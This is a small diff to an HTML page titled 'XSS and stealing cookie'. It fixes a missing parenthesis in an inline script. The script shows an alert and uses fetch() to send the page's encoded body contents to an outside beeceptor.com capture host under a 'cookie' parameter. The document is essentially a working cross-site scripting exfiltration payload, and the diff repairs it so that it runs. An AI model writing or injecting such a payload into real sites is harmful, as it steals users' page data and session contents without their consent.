@@ -4,7 +4,7 @@
 	<h2> XSS and stealing cookie </h2>
 	<script>
 		alert('XSS via print.html');
-		fetch('https://splitting.free.beeceptor.com?cookie=' + encodeURIComponent(document.body.innerHTML);
+		fetch('https://splitting.free.beeceptor.com?cookie=' + encodeURIComponent(document.body.innerHTML));
 	</script>
 </body>
 </html>
